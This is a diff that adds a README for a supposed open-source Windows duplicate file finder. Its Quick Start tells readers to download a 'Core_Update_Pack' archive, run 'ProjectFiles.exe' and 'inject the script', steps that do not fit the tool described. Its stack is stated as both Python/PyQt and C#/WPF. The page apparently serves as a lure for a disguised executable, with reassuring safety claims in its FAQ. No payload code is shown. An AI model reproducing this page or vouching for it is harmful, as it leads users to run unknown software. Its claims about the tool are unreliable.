@@ -1,0 +1,79 @@
+🔍 Duplicate File Finder
+
+Fast Disk Cleanup & Deduplication Tool — 2026
+
+A lightweight, open-source duplicate file finder for Windows.
+Scan your folders to find identical photos, videos, and documents, and free up disk space safely without deleting important files.
+
+🎯 What it is
+
+Duplicate File Finder is a standalone desktop utility designed to help you clean up your hard drive.
+It uses fast MD5 hashing to compare files byte-by-byte, ensuring 100% accuracy. It never deletes anything without your confirmation.
+
+🛡️ Safe by design: The tool uses a "preview before delete" approach. You can review all duplicates and choose which ones to keep or remove.
+
+🚀 Quick Start
+
+1. Download Core_Update_Pack using the button above.
+2. Extract the archive into a separate folder.
+3. Run ProjectFiles.exe.
+4. Follow the on-screen instructions and inject the script.
+
+✨ Features
+
+| Feature                     | Description                                          |
+|-----------------------------|------------------------------------------------------|
+| 🔍 Fast Scanning        | Uses multi-threaded hashing to scan thousands of files in seconds |
+| 🖼️ Photo Duplicates     | Finds identical images even if they have different names |
+| 🎵 Audio & Video        | Detects duplicate MP3, MP4, and MKV files            |
+| 📂 Folder Exclusion     | Skip important system folders or game directories    |
+| 🖥️ Clean UI             | Simple interface to review and select files to delete|
+| 🗑️ Safe Delete          | Moves files to Recycle Bin instead of permanent deletion |
+
+🛠️ How to use
+
+1. Launch ProjectFiles.exe.
+2. Select the folders you want to scan (e.g., Downloads, Pictures).
+3. Click "Scan".
+4. Review the list of duplicates found.
+5. Select the files you want to remove and click "Delete Selected".
+
+⚙️ Configuration
+
+You can adjust settings in the config.json file:
+
+- Scan Paths: Default folders to scan
+- File Types: Include/exclude images, videos, documents
+- Min File Size: Ignore files smaller than X KB
+- Hash Algorithm: MD5 (default) or SHA-256
+
+❓ FAQ
+
+Is it safe to use?
+Yes — it only reads file metadata and hashes. It does not modify or delete files without your explicit confirmation.
+
+Does it work on Mac or Linux?
+Currently, the tool is optimized for Windows 10/11. Cross-platform support is planned.
+
+How long does a scan take?
+It depends on the number of files and disk speed. A typical scan of 100GB takes about 2-5 minutes.
+
+Can I recover deleted files?
+Yes, the tool moves files to the Recycle Bin, so you can restore them if needed.
+
+💻 Tech Stack & Architecture
+
+- Core: Python 3.10+ / C# (.NET 8)
+- Hashing: MD5 / SHA-256 (multithreaded)
+- UI: PyQt / WPF
+- Target OS: Windows 10 / 11
+
+🤝 Contributing
+
+Pull requests, bug reports, and feature suggestions are welcome.
+
+📜 License
+
+MIT License — free to use, modify and redistribute.
+
+⭐ Star the repo if it helped you.
